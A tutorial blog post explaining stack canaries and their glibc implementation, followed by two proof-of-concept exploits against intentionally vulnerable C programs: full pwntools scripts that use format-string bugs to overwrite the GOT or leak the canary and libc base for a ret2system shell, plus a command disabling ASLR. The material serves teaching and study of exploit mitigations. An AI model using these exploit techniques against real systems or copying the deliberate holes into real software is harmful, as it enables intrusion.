
## Preface
Hey there!
After quite some time the second part will be finally published :) !
Sorry for the delay, real life can be overwhelming ;)..

[Last time](https://github.com/0x00rick/articles/tree/master/Data_Execution_Prevention) I have introduced this series by covering Data Execution Prevention (DEP).  
Today we're dealing with the next big technique.   
As the title already suggests it will be about stack canaries.  
The format will be similar to last time.  
First we will dealing with a basic introduction to the approach, directly followed by a basic exploitation part.  


> REMARK: The following is the result of a self study and might contain faulty information. If you find any let me know. Thanks!

## Requirements

   * Some spare minutes
   * A basic understanding of what causes memory corruptions
   * The will to ask or look up unknown terms yourself
   * Some ASM/C knowledge
   * Basic format string bugs
   * How linking processes/libraries works (GOT)



## Stack Canaries / Stack Cookies (SC)

### Basic Design

To prevent corrupted buffers during program runtime another technique besides [data execution prevention](https://github.com/0x00rick/articles/tree/master/Data_Execution_Prevention) called stack canaries was proposed and finally implemented as a counter measure against the emerging threat of buffer corruption exploits.  
It was adapted early!
Patching a single buffer vulnerability in an application is harmless, but even within one program the causes of a simple patched buffer size might cause harm to other areas.   
On top of that the amount of programs running with legacy code and system rights over their needs is [considerable large](http://gs.statcounter.com/os-version-market-share/windows/desktop/worldwide).   
Overall this patch driven nature of software development in combination with the usage of [type unsafe languages like C/C++](http://dl.acm.org/citation.cfm?id=2187679) makes such buffer problems still reappear too frequently.  
Instead of trying to fix the problem at source level, which patching tries to, [canaries](https://www.usenix.org/legacy/publications/library/proceedings/sec98/full_papers/cowan/cowan.pdf) try to fix the problem at hand: the stack structure.  

The basic methodology is to place a filler word, the canary, between local variables or buffer contents in general and the return address.  
This is done for [every* (*if the right compiler flag is chosen)](https://lwn.net/Articles/584225/) function called, not just once for some oblivious main function.  
So an overwriting of multiple canary values is often required during an exploit. 
A basic scheme is shown 



```
            Process Address                                   Process Address
            Space                                             Space
           +---------------------+                           +---------------------+
           |                     |                           |                     |
   0xFFFF  |  Top of stack       |                   0xFFFF  |  Top of stack       |
       +   |                     |                       +   |                     |
       |   +---------------------+                       |   +---------------------+
       |   |  malicious code     <-----+                 |   |  malicious code     |
       |   +---------------------+     |                 |   +---------------------+
       |   |                     |     |                 |   |                     |
       |   |                     |     |                 |   |                     |
       |   |                     |     |                 |   |                     |
       |   +---------------------|     |                 |   +---------------------|        
       |   |  return address     |     |                 |   |  return address     |
       |   +---------------------+     |                 |   +---------------------|
 stack |   |  saved EBP          +-----+           stack |   |  saved EBP          |
growth |   +---------------------+                growth |   +---------------------+
       |   |  local variables    |                       |   |  stack canary       |
       |   +---------------------+                       |   +---------------------+
       |   |                     |                       |   |  local variables    |
       |   |  buffer             |                       |   +---------------------+
       |   |                     |                       |   |                     |
       |   |                     |                       |   |  buffer             |
       |   +---------------------+                       |   |                     |
       |   |                     |                       |   |                     |
       |   |                     |                       |   +---------------------+
       |   |                     |                       |   |                     |
       v   |                     |                       v   |                     |
   0x0000  |                     |                   0x0000  |                     |
           +---------------------+                           +---------------------+



```

    Note: This is only a basic overview. detailed low-level views can slightly differ
   > **Remark**: Retake on [base pointers](https://stackoverflow.com/questions/1395591/what-is-exactly-the-base-pointer-and-stack-pointer-to-what-do-they-point) in case you forgot! 

The canary can consist of different metrics.
Random or terminator values are the commonly used ones in the end.  
When reaching (close to) a return instruction during code execution the integrity of the canary is checked first to evaluate if it was changed.  
If no alteration is found, execution resumes normally.  
If a tampered with canary value is detected program execution is terminated immediately, since it indicates a malicious intent.  
A user controlled input is often the cause for this :P .  
The most simple case for this scenario is a basic stack smashing attack, where the amount of bytes written to a buffer exceeds the buffer size.  
Pairing that with a system call that does not do any bounds checking results in [overwriting the canary value](http://ieeexplore.ieee.org/document/1324594/).  

The first implementation of stack canaries on Linux based systems appeared in 1997 with the publication of StackGuard, which came as a [set of patches for the GNU Compiler Collection (GCC)](https://www.usenix.org/legacy/publications/library/proceedings/sec98/full_papers/cowan/cowan.pdf).  


#### Terminator Canaries

Let's just take this sample code snipped for clarification: 

```c
    int main(int argv, char **argc) {
        int var1;
        char buf[80];
        int var2;
        strcpy(buf,argc[1]);
        print(buf);
        exit(0);
    }
```

As the name *terminator* suggests once it is reached during an attempted overwrite it should stop the overwriting.  
An example value for this is `0x000aff0d`.  
The `0x00` will stop `strcpy()` and we won’t be able to alter the return address.  
If `gets()` were used instead of `strcpy()` to read into a buffer, we would be able to write `0x00`, but `0x0a` would stop it.  
That is how these terminator values work on a basic level.  

In general we can say that a terminator canary contains NULL(0x00), CR (0x0d), LF (0x0a) and EOF (0xff).  
Such a combination of these four 2-byte characters should terminate most string operations, rendering the overflow attempt harmless.  


#### Random Canaries

Random canaries on the other hand do not try to stop string operations.  
They want to make it *exceedingly difficult* for attackers to find the right value so a process is terminated once tampering is detected.  
The random value is taken from `/dev/urandom` if available, and created by hashing the time of day if `/dev/urandom` is not supported.  
This randomness is sufficient to prevent most prediction attempts.  


----
### Closer look at canary implementations
Let's take a quick peek at the current canary implementation of the most recent [glibc 2.26 libc-start.c](https://ftp.gnu.org/gnu/libc/):

```c
  /* Set up the stack checker's canary.  */
  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);
  [...]
  __stack_chk_guard = stack_chk_guard;
```
The `_dl_setup_stack_chk_guard` function is looking like this:

```
static inline uintptr_t __attribute__ ((always_inline))
_dl_setup_stack_chk_guard (void *dl_random)
{
  union
  {
    uintptr_t num;
    unsigned char bytes[sizeof (uintptr_t)];
  } ret = { 0 };
  # __stack_chk_guard becomes a terminator canary
  if (dl_random == NULL)
    {
      ret.bytes[sizeof (ret) - 1] = 255;
      ret.bytes[sizeof (ret) - 2] = '\n';
    }
  # __stack_chk_guard will be a random canary
  else
    {
      memcpy (ret.bytes, dl_random, sizeof (ret));
#if BYTE_ORDER == LITTLE_ENDIAN
      ret.num &= ~(uintptr_t) 0xff;
#elif BYTE_ORDER == BIG_ENDIAN
      ret.num &= ~((uintptr_t) 0xff << (8 * (sizeof (ret) - 1)));
#else
# error "BYTE_ORDER unknown"
#endif
    }
  return ret.num;
}
```


What's interesting here is that we can see the basic design choices mentioned earlier!
`_dl_setup_stack_chk_guard()` allows to create all the canary types.
If `dl_random` is null, `__stack_chk_guard` will be a terminator canary, otherwise random canary.

-----
### Limitations
This technique is exposed to several weaknesses.   
One is namely *static canary values* that are easily found out using brute force or by simply repeatedly guessing...   
Using random or terminator values instead migrated this flaw early on. 
This hardens the security implications, but an adversary may still circumvent this technique.  
When finding a way to extract the canary value from the memory space of an application during runtime it is possible to bypass canary protected applications.  
Alternatively if a terminator canary like `0x000aff0d` is used we cannot write past it with common string operations, but it is possible to write to memory up until to the canary.  
This effectively allows to gain full control of the frame pointer.   
If this is possible, as well as having the possibility to write to a memory region like the stack or heap, we can bend the frame pointer to point to `terminator_canary+shellcode_address` in memory.  
This allows us to [return to injected shell code](http://staff.ustc.edu.cn/~bjhua/courses/security/2014/readings/stackguard-bypass.pdf).  

Another bypass is possible through a technique called structured [exception handler exploitation (SEH exploit)](https://www.exploit-db.com/docs/english/17505-structured-exception-handler-exploitation.pdf).  
It makes use of the fact that stack canaries modify function pro- and epilogue for canary verification purposes.  
If a buffer on stack or heap is overwritten during runtime, and the fault is noticed before the execution of the copy/write function returns, an exception is raised.  
The exception is passed to a local exception handler that again passes it to the correct system specific exception handler to handle the fault.  
Changing said exception handler to point to user controlled input like shell code makes it return to that.  
This bypasses any canary check and execution of any provided malicious input is accomplished.  

> Note: Structured exception handlers are Windows specific!


> Note2: These limitations do not represent all possibilities for how to bypass canaries!



____
## PoC 1 

### Abusing a stack canary disabled binary

I won't cover this over here again.  
It already was demonstrated how to do that with a basic stack smashing attack in my last [article](https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634).



### Abusing enabled stack canaries

    Note: ASLR is still disabled for now: echo 0 > /proc/sys/kernel/randomize_va_space
    

#### The vulnerable program

Let's consider this small program:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;


void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);
  printf("Welcome 0x00sec to Stack Canaries\n");

  strdup(buffer);
  return 0;

}

int main(int argc, char **argv)
{
  vuln();
}
```

For our PoC we don't need much, hence the program is quite small.  
All it does is it takes some input via `fgets()` and prints it with `printf()`.  
For some dubious reason `strdup()` is present here too ;)  

    Note: The strdup(s) function returns a pointer to a new string which is a duplicate of the string s.
    
Let's compile it with `gcc -fstack-protector-all -m32 -o vuln vuln.c`.  
And check if I didn't lie about the enabled exploit mitigations:  
    
    gef➤  checksec
    [+] checksec for '/0x00sec/Canary/binary/vuln'
    Canary                        : Yes →  value: 0xd41a2e00
    NX                            : Yes
    PIE                           : No
    Fortify                       : No
    RelRO                         : Partial
    gef➤  
    
Data execution prevention (NX) as well as canaries are fully enabled.  
For the sake of usability `gef` and other gdb enhancements can already display the current canary value.
Alternatively if stack canaries are present we always have the ` __stack_chk_fail` symbol, which we can search for:

    $ readelf -s ./vuln | grep __stack_chk_fail
         5: 00000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@GLIBC_2.4 (3)
        58: 00000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@@GLIBC_2




#### Brief look at the assembly 

    gef➤  disassemble main
    Dump of assembler code for function main:
       0x080485ef <+0>:	lea    ecx,[esp+0x4]
       0x080485f3 <+4>:	and    esp,0xfffffff0
       0x080485f6 <+7>:	push   DWORD PTR [ecx-0x4]
       0x080485f9 <+10>:	push   ebp
       0x080485fa <+11>:	mov    ebp,esp
       0x080485fc <+13>:	push   ecx
       0x080485fd <+14>:	sub    esp,0x24
       0x08048600 <+17>:	mov    eax,ecx
       0x08048602 <+19>:	mov    edx,DWORD PTR [eax]
       0x08048604 <+21>:	mov    DWORD PTR [ebp-0x1c],edx
       0x08048607 <+24>:	mov    eax,DWORD PTR [eax+0x4]
       0x0804860a <+27>:	mov    DWORD PTR [ebp-0x20],eax
       0x0804860d <+30>:	mov    eax,gs:0x14                          ; canary right here
       0x08048613 <+36>:	mov    DWORD PTR [ebp-0xc],eax      
       0x08048616 <+39>:	xor    eax,eax                              ; at this point we can inspect the canary in gdb as well
       0x08048618 <+41>:	call   0x8048576 <vuln>                     ; vuln() function call 
       0x0804861d <+46>:	mov    eax,0x0
       0x08048622 <+51>:	mov    ecx,DWORD PTR [ebp-0xc]
       0x08048625 <+54>:	xor    ecx,DWORD PTR gs:0x14                ; canary check routine is started
       0x0804862c <+61>:	je     0x8048633 <main+68>
       0x0804862e <+63>:	call   0x8048410 <__stack_chk_fail@plt>     ; canary fault handler if check fails
       0x08048633 <+68>:	add    esp,0x24
       0x08048636 <+71>:	pop    ecx
       0x08048637 <+72>:	pop    ebp
       0x08048638 <+73>:	lea    esp,[ecx-0x4]
       0x0804863b <+76>:	ret    
    End of assembler dump.
    
    gef➤  disassemble vuln
    Dump of assembler code for function vuln:
       0x08048576 <+0>:	push   ebp
       0x08048577 <+1>:	mov    ebp,esp
       0x08048579 <+3>:	sub    esp,0x218
       0x0804857f <+9>:	mov    eax,gs:0x14                            ; canary right here
       0x08048585 <+15>:	mov    DWORD PTR [ebp-0xc],eax
       0x08048588 <+18>:	xor    eax,eax
       0x0804858a <+20>:	mov    eax,ds:0x804a040
       0x0804858f <+25>:	sub    esp,0x4
       0x08048592 <+28>:	push   eax
       0x08048593 <+29>:	push   0x200
       0x08048598 <+34>:	lea    eax,[ebp-0x20c]
       0x0804859e <+40>:	push   eax
       0x0804859f <+41>:	call   0x8048400 <fgets@plt>                 ; fgets routine to fetch user input
       0x080485a4 <+46>:	add    esp,0x10
       0x080485a7 <+49>:	sub    esp,0xc
       0x080485aa <+52>:	lea    eax,[ebp-0x20c]
       0x080485b0 <+58>:	push   eax                                   ; user input is pushed as argument for printf
       0x080485b1 <+59>:	call   0x80483d0 <printf@plt>                ; printf routine call
       0x080485b6 <+64>:	add    esp,0x10
       0x080485b9 <+67>:	sub    esp,0xc
       0x080485bc <+70>:	push   0x80486e4                             ; string is pushed as argument for puts
       0x080485c1 <+75>:	call   0x8048420 <puts@plt>                  ; puts routine call
       0x080485c6 <+80>:	add    esp,0x10
       0x080485c9 <+83>:	sub    esp,0xc
       0x080485cc <+86>:	lea    eax,[ebp-0x20c]
       0x080485d2 <+92>:	push   eax                                   ; buffer contents pushed as argument to strdup
       0x080485d3 <+93>:	call   0x80483f0 <strdup@plt>                ; strdup routine call
       0x080485d8 <+98>:	add    esp,0x10 
       0x080485db <+101>:	nop
       0x080485dc <+102>:	mov    eax,DWORD PTR [ebp-0xc]
       0x080485df <+105>:	xor    eax,DWORD PTR gs:0x14                ; canary check routine is started
       0x080485e6 <+112>:	je     0x80485ed <vuln+119>
       0x080485e8 <+114>:	call   0x8048410 <__stack_chk_fail@plt>     ; canary fault handler if check fails
       0x080485ed <+119>:	leave  
       0x080485ee <+120>:	ret    
    End of assembler dump.
    gef➤  

So nothing out of the ordinary so far.   
I did not strip the binary and everything we would expect is at the correct place.  
Additionally the canary initializations and checks are nicely observable!  
Furthermore it is shown that the canary check is done in every called function, not just in the `main()` function of the program.  


#### Recap Format String attacks
The following exploit makes use of a format string bug.
Hence I will quickly recap the basics here.
Mostly used in conjunction with `printf()`.
If we have control over what `printf()` is gonna print, let's say the contents of a user controlled `buf[64]` then we can use the following format parameters as input to manipulate the output!


    Parameters*       Meaning                                       Passed as
    --------------------------------------------------------------------------
    %d                decimal (int)                                 value
    %u                unsigned decimal (unsigned int)               value
    %x                hexadecimal (unsigned int)                    value
    %s                string ((const) (unsigned) char*)             reference
    %n                number of bytes written so far, (*int)        reference
    
    *Note: Only most relevant format paramters displayed
    
If we pass **n** `%08x. `  to `printf()` it instructs the function to retrieve **n** parameters from the stack and display them as 8-digit padded hexadecimal numbers.  
This can be used to view memory at **any** location if done right, or even write a wanted amount of bytes (with `%n`) to a certain address in memory!

If you feel you need to brush up on it by a lot take a look at this [format string writeup from picoCTF](https://0x00sec.org/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920).


#### Canary bypass

We will take a closer look at overwriting the Global Offset Table (GOT)!    
This is possible because we don't have a fully enabled RelRO:

**Partial RELRO:**  

    * the ELF sections are reordered so that the ELF internal data sections (.got, .dtors, etc.) precede the program's data sections (.data and .bss)
    * non-PLT GOT is read-only
    * GOT is still writeable
    
**Full RELRO:**  

    * supports all the features of partial RELRO
    * the entire GOT is also (re)mapped as read-only
    
    
If you're struggling with the whole Global Offset Table mess I strongly recommend reading these articles by @_py:
    
1. [Linux Internals ~ Dynamic Linking Wizardry](https://0x00sec.org/t/linux-internals-the-art-of-symbol-resolution/1488)!  
2. and [Linux Internals ~ The Art Of Symbol Resolution](https://0x00sec.org/t/linux-internals-dynamic-linking-wizardry/1082) for an even more detailed introduction!

If you're still continuing reading without prior knowledge here is the basic approach I'm gonna take:

    1. Find a way to get a shell
    2. Calculate the bytes to write for a format string attack
    3. Overwrite the GOT entry for strdup() with a function we can actually use for an exploit: system()    
    

First we want to examine where our local libc is located.   
We can do this from within gdb as well:  

    gef➤  vmmap libc
    Start      End        Offset     Perm Path
    0xf7dfd000 0xf7fad000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so       <-
    0xf7fad000 0xf7faf000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so
    0xf7faf000 0xf7fb0000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so
    gef➤  

The base address of the used libc is at `0xf7dfd000`.  

Next we want to find a way to pop a shell.  
What could be better than `system()`:  

    $ readelf -s /lib/i386-linux-gnu/libc-2.23.so | grep system
        245: 00112ed0    68 FUNC    GLOBAL DEFAULT      13 svcerr_systemerr@@GLIBC_2.0
        627: 0003ada0    55 FUNC    GLOBAL DEFAULT      13 __libc_system@@GLIBC_PRIVATE
        1457: 0003ada0    55 FUNC    WEAK   DEFAULT     13 system@@GLIBC_2.0            <-

`system()` offset in glibc is `0x3ada0`.  

Let's add up those to addresses to get the final address of `system()` in the library.   

> 0xf7dfd000 + 0x3ada0 = 0xf7e37da0

Let's check if we didn't fail our maths:

    gef➤ x 0xf7e37da0
    0xf7e37da0 <__libc_system>:	0x8b0cec83
    gef➤

Looks good! Sweet!  
> Note: Reminder on how [system()](https://github.com/lattera/glibc/blob/master/sysdeps/posix/system.c) works.  

Next on our list is to find the address of `strdup()` in the GOT to be able to overwrite it!  
 
Let's take a look at the assembly snippet from the `vuln()` function for a second:  
        
       ...
       0x080485c9 <+83>:	sub    esp,0xc
       0x080485cc <+86>:	lea    eax,[ebp-0x20c]
       0x080485d2 <+92>:	push   eax
    => 0x080485d3 <+93>:	call   0x80483f0 <strdup@plt>
       0x080485d8 <+98>:	add    esp,0x10
       0x080485db <+101>:	nop
       ...


    gef➤  disassemble 0x80483f0
    Dump of assembler code for function strdup@plt:
       0x080483f0 <+0>:	jmp    DWORD PTR ds:0x804a014
       0x080483f6 <+6>:	push   0x10
       0x080483fb <+11>:	jmp    0x80483c0
    End of assembler dump.
    gef➤  


`0x804a014` is the address we want to overwrite!  


#### Exploit

Following now is a quick script I put together to get a shell without disrupting any normal control flow of the program.  
The bytes to overwrite `strdup()` to get `system()` where manually calculated by trial and error.
First you want to check where on the stack your buffer arguments reside by doing something like this:


```python

...
exploit = ""

exploit += "AAAABBBBCCCC"                      

exploit += "%x "*10
...
```
Ideally you can quickly find the `41414141 42424242 43434343` in the output besides other addresses. 
If you do you can see at which position your fed input is dumped.
For example it could look like this:

`AAAABBBBCCCC200 f7faf5a0 f7ffd53c ffffcc48 f7fd95c5 0 41414141 42424242 43434343 25207825 78252078 20782520 25207825 78252078 20782520` 
That would mean our input is on the 7th position of the stack.
We can replace `AAAABBBBCCCC` now with something more meaningful like an entry from the GOT we want ot overwrite.  

Basically what we want to do next is write a certain amount of bytes and with that change the address of `strdup()`.  
    
I do this 4 times to overwrite the 4 2byte positions of `strdup()` within the GOT.  

```python
#!/usr/bin/env python

import argparse
from pwn import *
from pwnlib import *

context.arch ='i386'
context.os ='linux'
context.endian = 'little'
context.word_size = '32'
context.log_level = 'DEBUG'

binary = ELF('./binary/vuln')
libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')


def pad(s):
    return s+"X"*(512-len(s))


def main():
    parser = argparse.ArgumentParser(description='pwnage')
    parser.add_argument('--dbg', '-d', action='store_true')
    args = parser.parse_args()

    exe = './binary/vuln'

    strdup_plt = 0x804a014
    system_libc = 0xf7e37da0

    exploit = "sh;#    "

    exploit += p32(strdup_plt)
    exploit += p32(strdup_plt+1)
    exploit += p32(strdup_plt+2)
    exploit += p32(strdup_plt+3)

    exploit += "%9$136x"
    exploit += "%9$n"
    
    exploit += "%221x"
    exploit += "%10$n"
    
    exploit += "%102x"
    exploit += "%11$n"
    
    exploit += "%532x"
    exploit += "%12$n"



    padding = pad(exploit)

    if args.dbg:
        r = gdb.debug([exe], gdbscript="""
                b *vuln+92
                b *vuln+98
                continue
                """)
    else:
        r = process([exe])

    r.send(padding)
    r.interactive()


if __name__ == '__main__':
    main()
    sys.exit(0)
```

###Proof
<img src="//0x00sec.s3.amazonaws.com/original/2X/1/1e7f38bb8cfbe9e46f4420e3f6a3cf7d58629d14.png" width="578" height="500">

Ok this worked but it did not necessarily defeat stack canaries!
I just opened another can of delicious attack surfaces and with that I was able to bypass the canaries completely.
Since that just doesn't feel quite right I will give another PoC for defeating the mechanism in a more appropriate manner.

 
 ____
## PoC 2
### Defeating stack canaries 4 realz now

Okay this time around a more 'standard' way of defeating stack canaries is shown

#### Vulnerable program


```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define STDIN 0


void untouched(){
    char answer[32];
    printf("\nCanaries are fun aren't they?\n");
    exit(0);
}

void minorLeak(){
    char buf[512];
    scanf("%s", buf);
    printf(buf);
}

void totallySafeFunc(){
    char buf[1024];
    read(STDIN, buf, 2048);
}

int main(int argc, char* argv[]){

    setbuf(stdout, NULL);
    printf("echo> ");
    minorLeak();
    printf("\n");
    printf("read> ");
    totallySafeFunc();

    printf("> I reached the end!");

    return 0;
}

```
This just reads some user input and prints some stuff back out.
As the function names suggest the easiest way to beat canaries is through an information leak.
We can accomplish this by using the `minorLeak()` function.
Similar as before we will abuse a format string.
Afterwards we leverage a buffer overflow opportunity in the `totallySafeFunc()` to redirect control flow to our likings.

    Note: Obviously this binary is heavily vulnerable!

The focus for the exploit will be on `minorLeak()` and `totallySafeFunc()`. 
Let's check out the `asm` for any possible anomalies:


    gef➤  disassemble minorLeak 
    Dump of assembler code for function minorLeak:
       0x080485f6 <+0>:	push   ebp
       0x080485f7 <+1>:	mov    ebp,esp
       0x080485f9 <+3>:	sub    esp,0x218                            ; 536 bytes on the stack are reserved
       0x080485ff <+9>:	mov    eax,gs:0x14                          ; stack canary 
       0x08048605 <+15>:	mov    DWORD PTR [ebp-0xc],eax
       0x08048608 <+18>:	xor    eax,eax
       0x0804860a <+20>:	sub    esp,0x8
       0x0804860d <+23>:	lea    eax,[ebp-0x20c]
       0x08048613 <+29>:	push   eax
       0x08048614 <+30>:	push   0x804879f
       0x08048619 <+35>:	call   0x80484b0 <__isoc99_scanf@plt>   ; user input is copied into buf
       0x0804861e <+40>:	add    esp,0x10
       0x08048621 <+43>:	sub    esp,0xc
       0x08048624 <+46>:	lea    eax,[ebp-0x20c]
       0x0804862a <+52>:	push   eax
       0x0804862b <+53>:	call   0x8048450 <printf@plt>           ; the contents of buf are printed out
       0x08048630 <+58>:	add    esp,0x10
       0x08048633 <+61>:	nop
       0x08048634 <+62>:	mov    eax,DWORD PTR [ebp-0xc]          ; stack canary verifucation routine started
       0x08048637 <+65>:	xor    eax,DWORD PTR gs:0x14
       0x0804863e <+72>:	je     0x8048645 <minorLeak+79>
       0x08048640 <+74>:	call   0x8048460 <__stack_chk_fail@plt>
       0x08048645 <+79>:	leave  
       0x08048646 <+80>:	ret                                     ; return to main()
    End of assembler dump.
    gef➤ 

----

    gef➤  disassemble totallySafeFunc 
    Dump of assembler code for function totallySafeFunc:
       0x08048647 <+0>:	push   ebp
       0x08048648 <+1>:	mov    ebp,esp
       0x0804864a <+3>:	sub    esp,0x418                                ; 1048 bytes are reserved on the stack
       0x08048650 <+9>:	mov    eax,gs:0x14                              ; stack canary
       0x08048656 <+15>:	mov    DWORD PTR [ebp-0xc],eax
       0x08048659 <+18>:	xor    eax,eax
       0x0804865b <+20>:	sub    esp,0x4
       0x0804865e <+23>:	push   0x800
       0x08048663 <+28>:	lea    eax,[ebp-0x40c]
       0x08048669 <+34>:	push   eax
       0x0804866a <+35>:	push   0x0
       0x0804866c <+37>:	call   0x8048440 <read@plt>                 ; user input is requestet
       0x08048671 <+42>:	add    esp,0x10
       0x08048674 <+45>:	nop
       0x08048675 <+46>:	mov    eax,DWORD PTR [ebp-0xc]              ; stack canary verification routine
       0x08048678 <+49>:	xor    eax,DWORD PTR gs:0x14
       0x0804867f <+56>:	je     0x8048686 <totallySafeFunc+63>
       0x08048681 <+58>:	call   0x8048460 <__stack_chk_fail@plt>
       0x08048686 <+63>:	leave  
       0x08048687 <+64>:	ret                                         ; return to main()
    End of assembler dump.
    gef➤ 

So far we can spot nothing out of the ordinary except the obvious vulnerabilities and the presence of stack canaries.
That said, let's directly jump into the exploit development!

#### Exploit

```python
#!/usr/bin/env python2

import argparse
from pwn import *
from pwnlib import *

context.arch ='i386'
context.os ='linux'
context.endian = 'little'
context.word_size = '32'
context.log_level = 'DEBUG'

binary = ELF('./binary/realvuln4')
libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')


def leak_addresses():
    leaker = '%llx.' * 68
    return leaker


def prepend_0x_to_hex_value(hex_value):
    full_hex_value = '0x' + hex_value
    return full_hex_value


def extract_lower_8_bits(double_long_chunk):
    return double_long_chunk[len(double_long_chunk) / 2:]


def cast_hex_to_int(hex_value):
    return int(hex_value, 16)


def get_canary_value(address_dump):
    get_canary_chunk = address_dump.split('.')[-2]
    get_canary_part = extract_lower_8_bits(get_canary_chunk)
    canary_with_pre_fix = prepend_0x_to_hex_value(get_canary_part)
    print("[+] Canary value is {}".format(canary_with_pre_fix))
    canary_to_int = cast_hex_to_int(canary_with_pre_fix)
    return canary_to_int


def get_libc_base_from_leak(address_dump):
    get_address_chunk = address_dump.split('.')[1]
    get_malloc_chunk_of_it = extract_lower_8_bits(get_address_chunk)
    malloc_with_prefix = prepend_0x_to_hex_value(get_malloc_chunk_of_it)
    print("[+] malloc+26 is @ {}".format(malloc_with_prefix))
    libc_base = cast_hex_to_int(malloc_with_prefix)-0x1f6faa                # offset manually calculated by leak-libcbase
    print("[+] This puts libc base address @ {}".format(hex(libc_base)))
    return libc_base


def payload(leaked_adrs):
    canary = get_canary_value(leaked_adrs)
    libc_base = get_libc_base_from_leak(leaked_adrs)

    bin_sh = int(libc.search("/bin/sh").next())
    print("[+] /bin/sh located @ offset {}".format(hex(bin_sh)))

    shell_addr = libc_base + bin_sh
    print("[+] Shell address is {}".format(hex(shell_addr)))

    print("[+] system@libc has offset: {}".format(hex(libc.symbols['system'])))
    system_call = libc_base + libc.symbols['system']
    print("[+] This puts the system call to {}".format(hex(system_call)))

    payload = ''
    payload += cyclic(1024)
    payload += p32(canary)
    payload += 'AAAA'
    payload += 'BBBBCCCC'
    #payload += p32(0x080485cb)          # jump to untouched to show code redirection
    #payload += p32(start_of_stack)      # jump to stack start if no DEP this allows easy shell popping
    payload += p32(system_call)
    payload += 'AAAA'
    payload += p32(shell_addr)
    return payload


def main():
    parser = argparse.ArgumentParser(description='pwnage')
    parser.add_argument('--dbg', '-d', action='store_true')
    args = parser.parse_args()

    exe = './binary/realvuln4'

    if args.dbg:
        r = gdb.debug([exe], gdbscript="""
                b *totallySafeFunc+42
                continue
                """)
    else:
        r = process([exe])

    r.recvuntil("echo> ")
    r.sendline(leak_addresses())

    leaked_adrs = r.recvline()
    print(leaked_adrs)

    exploit = payload(leaked_adrs)

    r.recvuntil("read> ")
    r.sendline(exploit)

    r.interactive()


if __name__ == '__main__':
    main()
    sys.exit(0)
```
This exploit is not the prettiest of all exploit scripts, but it does the job ;) .

This quick script will exactly do what I shortly explained before.
Here is another breakdown:


1. First we leak a bunch of addresses with the `%llx.` format string (long long-sized integer)
2.  Analyze the leaked addresses, 
2b. It turns out our stack canary is at the 68th leaked address
2c. Furthermore the middle of the stack is within the lower 8 bits of the first leaked ll integer!
5. Extract these values from the leak
4. Craft payload: 
4b. Fill buffer with junk
4c. Insert leaked canary
4d. code redirection to `system@glibc`
4e. fake Base Pointer 
4f. address of `/bin/sh` appended lastly
   

### Proof
![poc](https://github.com/0x00rick/articles/blob/master/Stack_Canaries/images/poc.png)

We can see in the output that control flow got redirected and popped us a shell!
So what do we do with this information now?

If we assume we have a possible information leak and can get the canary value at all times, bypassing them is not a problem.
Redirection/Changing the control flow of a program is the next big step.

   * Just pulling it back to the Stack will not work if DEP is enabled.
   * Overwriting the GOT is only easily possible if RELRO is only partially enabled, and leaking the canary might not even be needed in this use case,
   * Otherwise good ol' ret2system still works wonders :) 


## Conclusion
The covered approach was first implemented over 20 years ago.  
For such an early adaption the security aspect was quite high.  
But which implications for canaries must be fulfilled if they want to be viable?
We kinda showed that by focusing on their weaknesses!

To be secure, a canary must ensure at least the following properties:

    * be not predictable (must be generated from a source with good entropy)    => depends on the used random generator!
    * must be located in a non-accessible location                              => we were able to access it!
    * cannot be brute-forced                                                    => goes hand in hand with the argument before and was not true!
    * should always contain at least one termination character                  => currently depends on the used canary, so not always the case!
     
Clever instrumentation of other program components made it possible to still find a way to build a bypass or even avoid them completely even when present in every function within a program.
The two presented PoCs hopefully showed the above in a digestible way.
 

As always in my series I'm looking forward to any feedback.  
But more importantly I hope the stack canary overview cleared any misconceptions was helpful in any way.  
Next on the plate will be address space layout randomization! 


-ricksanchez
### Further References
[Linux gcc stack protector flags](https://outflux.net/blog/archives/2014/01/27/fstack-protector-strong/)
[Playing with canaries for an in depth look at canary implementations](https://www.elttam.com.au/blog/playing-with-canaries/)
[Stack smashing article on ExploitDB](https://www.exploit-db.com/papers/24085/)
[Bypassing stack cookies on corelan](https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/)
[Bypassing exploit mitigations on SO](https://security.stackexchange.com/questions/20497/stack-overflows-defeating-canaries-aslr-dep-nx)
[SEH exploit PoC for Windows example](https://github.com/angelorighi/exploits/blob/master/Image2PDF-seh-poc.py)
[An excellent Phrack Issue 56 on stack canaries](http://phrack.org/issues/56/5.html)
[An excellent Phrack Issue 55 on overwriting a frame pointer](http://www.phrack.com/issues/55/8.html#article)
[StackGuard: Automatic Adaptive Detection and Prevention of Buffer-Overflow Attacks](https://www.usenix.org/legacy/publications/library/proceedings/sec98/full_papers/cowan/cowan.pdf)
[Protecting Systems from Stack Smashing Attacks with StackGuard](https://www.cs.jhu.edu/~rubin/courses/sp03/papers/stackguard.pdf)
[babypwn with leaking stack canaries](https://github.com/VulnHub/ctf-writeups/blob/master/2017/codegate-prequels/babypwn.md)
[4 ways to bypass stack canaries (no real PoCs tho)](http://staff.ustc.edu.cn/~bjhua/courses/security/2014/readings/stackguard-bypass.pdf)
[Blackhat '09 talk about overall exploit mitigation security](https://www.blackhat.com/presentations/bh-europe-09/Fritsch/Blackhat-Europe-2009-Fritsch-Bypassing-aslr-slides.pdf)
